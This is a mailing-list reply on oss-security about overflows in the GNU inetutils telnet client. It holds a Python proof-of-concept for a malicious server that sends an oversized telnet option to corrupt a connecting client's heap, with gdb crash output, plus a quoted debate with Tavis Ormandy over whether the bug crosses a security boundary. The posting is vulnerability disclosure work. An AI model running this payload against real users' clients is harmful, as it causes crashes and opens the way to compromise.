X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5602" "Wednesday" "12" "December" "2018" "17:21:05" "-0800" "Hacker Fantastic" "hackerfantastic@googlemail.com" "<CAG-OieMJ=sJxrf37ndMZF8akPtTibc-RMAgi8+Dkxz5URabR+A@mail.gmail.com>" "143" "Re: [oss-security] Multiple telnet.c overflows" "^Cc:" nil nil "12" "2018121301:21:05" "[oss-security] Multiple telnet.c overflows" (number mark "        hackerfantas Dec 12  143/5602  " thread-indent "\"Re: [oss-security] Multiple telnet.c overflows\"\n") "<CAJ_zFkKWP18xP6jUh=Gax3o_R4mFB905FC9yKWTd9-VEwEZEmA@mail.gmail.com>" ("<CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>" "<3f060bee-a765-4cd8-e752-e0cdfef5c6f2@oracle.com>" "<CAJ_zFkK-Wg5cvzQ_Om+=+pyddbyPvT8D07qL8wL8NYX6MNnnXg@mail.gmail.com>" "<CAG-OieODDwrDfoci2ehVUbHg13Ehz66VB50KERZ01qCdrgCLBw@mail.gmail.com>" "<CAJ_zFkLKWJnC9t27kN74jNueh3nTqx2+2hB3dsv74CsfBY_qfg@mail.gmail.com>" "<CAG-OieOUdanQyhyksodXwP7WyQpnAh0t3gy_Z_Cq-PTf+22GYw@mail.gmail.com>" "<CAJ_zFkKWP18xP6jUh=Gax3o_R4mFB905FC9yKWTd9-VEwEZEmA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 24418 invoked by uid 550); 13 Dec 2018 09:13:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 23722 invoked from network); 13 Dec 2018 01:21:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=googlemail.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=wYWGTrl17kk1/66XtIig2If/+1BIZIKqUMEkLXw+GiA=;
        b=JSa1f+U6zM5XxNqbTnVsLomiiKvEilyePqMv2qG+PZF8F97kRG/rMccY6n1DI7Ef5o
         2ZH3Y50l3s4rKmNzSb6ijak47ZVKtZrOKjk2hh1kKrD2wNfbIoam2wzLhOnTUQIeSNa2
         cLwJIOW6z3SMppghUSVdZS7lrcxDRr/GKNv+qlLBpmqdPCKk+AiIP0dW4TIt0aoX6sin
         InPBIoVskPFLUsQG+3uwDpgrNYrnABHq46Iyd2P1K57NfdAEot90q+MSm4HXDiMe2dN/
         pI1mfpgAFp4u+CSzvBUk7x8xp26P2uITO3jPYHlR2IllSbmcWPtJUnRyXNHnfdnsQuZP
         YMJw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=wYWGTrl17kk1/66XtIig2If/+1BIZIKqUMEkLXw+GiA=;
        b=paOT5g0pTxzZpGs2oiZUOoX88onUrxhMksXf1W3B5oWZ4tUr7u4djpF+njrGoW5mxK
         JNxpSM5D5B0AYBCr/4QBC8lIHmnPWHQDNwX29CCo4Mc6T5Havh7NzmvHrJPlSXPrIrUu
         M5QkoKieJrQLymivbcOWNFU+ClgQo5PKr0uzzzKtoBPEYV6D1bZ2jqoZYZrXGPUJFm2r
         iTmGepCFbcQzotKbGOTM8+gF1EU6MFepvtwVAJ6qYZZo7wqaGghGhb1cU7Xym9sIbmG7
         RXM42UM1xfgRyRkyUfxE5GI8Abkk7qoWpHhPPjPnbpjYpckBX46kF6M7PkqCaX9TU7C1
         USoA==
X-Gm-Message-State: AA+aEWYO/8ZHuAQ3/+6aYgMa57oJaXZp2BrPOXBnhTcVCRRqHDStBava
	NC8z66pMTXNeE/kmb+8I+ZVtPdWgfqpJBbda/fQ=
X-Google-Smtp-Source: AFSGD/XsbASLFexd7Yi9qjUhAKB7w7CCfbiqLmsWXygGcgkSlgA+en4G76MWCORezkhPNld11miRebT8nIh/lP7h8MI=
X-Received: by 2002:a19:6f0a:: with SMTP id k10mr12266933lfc.119.1544664077536;
 Wed, 12 Dec 2018 17:21:17 -0800 (PST)
MIME-Version: 1.0
References: <CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>
 <3f060bee-a765-4cd8-e752-e0cdfef5c6f2@oracle.com> <CAJ_zFkK-Wg5cvzQ_Om+=+pyddbyPvT8D07qL8wL8NYX6MNnnXg@mail.gmail.com>
 <CAG-OieODDwrDfoci2ehVUbHg13Ehz66VB50KERZ01qCdrgCLBw@mail.gmail.com>
 <CAJ_zFkLKWJnC9t27kN74jNueh3nTqx2+2hB3dsv74CsfBY_qfg@mail.gmail.com>
 <CAG-OieOUdanQyhyksodXwP7WyQpnAh0t3gy_Z_Cq-PTf+22GYw@mail.gmail.com> <CAJ_zFkKWP18xP6jUh=Gax3o_R4mFB905FC9yKWTd9-VEwEZEmA@mail.gmail.com>
In-Reply-To: <CAJ_zFkKWP18xP6jUh=Gax3o_R4mFB905FC9yKWTd9-VEwEZEmA@mail.gmail.com>
Message-ID: <CAG-OieMJ=sJxrf37ndMZF8akPtTibc-RMAgi8+Dkxz5URabR+A@mail.gmail.com>
Content-Type: multipart/alternative; boundary="000000000000a3915f057cdd215f"
Cc: oss-security@lists.openwall.com
Date: Wed, 12 Dec 2018 17:21:05 -0800
From: Hacker Fantastic <hackerfantastic@googlemail.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Multiple telnet.c overflows
To: Tavis Ormandy <taviso@google.com>

--000000000000a3915f057cdd215f
Content-Type: text/plain; charset="UTF-8"

Please see the below proof of concept in triggering the heap overflow using
the IAC SB TELQUAL_IS environment option variable assignment. As per my
original advisory, which did not fully indicate the details but gave the
overview of how to trigger the condition.

#!/usr/bin/env python
# Proof-of-concept exploit to settle debate on remote
# exploitability of telnet client overflows identified
# by Hacker House in previous advisory.
#
# Starting program: /usr/bin/telnet 127.0.0.1 2323
# Trying 127.0.0.1...
# Connected to 127.0.0.1.
# Escape character is '^]'.
#
# Program received signal SIGSEGV, Segmentation fault.
# 0x0000555555561172 in ?? ()
# (gdb) i r
# rax            0x0                 0
# rbx            0x55555557b100      93824992391424
# rcx            0x0                 0
# rdx            0x1203              4611
# rsi            0x1                 1
# rdi            0x203               515
# rbp            0x0                 0x0
# rsp            0x7fffff7ff000      0x7fffff7ff000
# r8             0x0                 0
# r9             0x0                 0
# r10            0x0                 0
# r11            0x246               582
# r12            0x55555556e3c4      93824992338884
# r13            0x555555586140      93824992436544
# r14            0x55555557b140      93824992391488
# r15            0x41                65
# rip            0x555555561172      0x555555561172
# eflags         0x10246             [ PF ZF IF RF ]
# cs             0x33                51
# ss             0x2b                43
# ds             0x0                 0
# es             0x0                 0
# fs             0x0                 0
# gs             0x0                 0
#
# -- Hacker Fantastic
# 12/12/2018 - h0h0h0 merry xmas
# https://hacker.house

import sys
import socket

# telnet initial negotiation
buffer = b'\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27'

# Send malformed and oversized IAC telnet options
buffer2 =b'\xff\xfa\x18\x01'  # set linespeed
buffer2 +=b'A'*5000
buffer2 +=b'\xff\xf0'         # end option

HOST = '0.0.0.0'
PORT = 2323

if __name__ == "__main__":
    print("[+] GNU/inetutils <= 1.9.4 telnet client heap overflow (IAC
TELQUAL_IS)")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        while conn:
            print("[-] connected, corrupting client heap")
            conn.sendall(buffer)
            conn.sendall(buffer2)
        s.close()


On Wed, Dec 12, 2018 at 12:10 PM Tavis Ormandy <taviso@google.com> wrote:

> On Wed, Dec 12, 2018 at 11:35 AM Hacker Fantastic
> <hackerfantastic@googlemail.com> wrote:
> >
> > Hi Tavis,
> >
> > The "little used" package you mentioned is in some distributions a
> dependency of "xorg-xinit" (:: removing inetutils breaks dependency
> 'inetutils' required by xorg-xinit in Arch Linux). The security boundary in
> the Mikrotik example is "escape of restricted shells" which is also in the
> TLDR; advisory. If you are unhappy with how I described the issue and wish
> to spend time and ultimately money researching remotely reachable code
> paths (aside from the URI handler example I already gave you) then it is
> worth looking into more detail the issues with the heap overflow and if it
> is reachable in the client via a server-side telnetd implementation for
> instance. The code there is a mess.
> >
> > As I already stated, I am unable to account for every use of telnet
> client-side code or how it is called in every application, particularly all
> the projects out there used from open-source community or co-opted by
> vendors into commercial offerings (like the given example, Mikrotik).
> Splitting hairs over security boundaries of a single issue with many use
> cases is not something I have time for, the vulnerability is exactly as
> described with security relevant impacts in my original advisory. It would
> be nice to see the heap overflow reached via a telnetd service just to
> prove a point but ultimately it is beyond the scope of this discussion, why
> not put the energy you spent on these emails to use exploring if the heap
> is also corrupted in such instances? ;-)
> >
>
> The energy I spent asking if a security boundary being crossed was
> minimal. I think the answer is that you do not know of any cases of
> this being a security boundary, but you feel that all bugs are
> security bugs whether or not a security boundary is crossed, because
> you don't know how someone might be using the software.
>
> > It was considered a security issue for such straight-forward restricted
> shell escapes in 2004/2005 (when there were numerous reported instances of
> such occurring in telnet clients alongside other client-side overflows).
> One of the issues is addressed in the implementations of some BSD clients
> and not in others.
> >
> > Just because you do not know how to exploit a bug does not mean it does
> not have security implications, it just means they have not been discovered
> yet or the researcher does not have the luxury of time that others have.
> >
> > I hope this clarifies my points satisfactorily for you.
>
> It certainly does, thank you. I think we disagree on what qualifies as
> a vulnerability, but I'm still very grateful for you reporting this.
>
> Tavis.
>


-- 
Matthew Hickey
Tel: +44 7543 661237
Web: http://blog.hackerfantastic.com

Please visit my website for blog postings, status updates and project
information.

--000000000000a3915f057cdd215f--
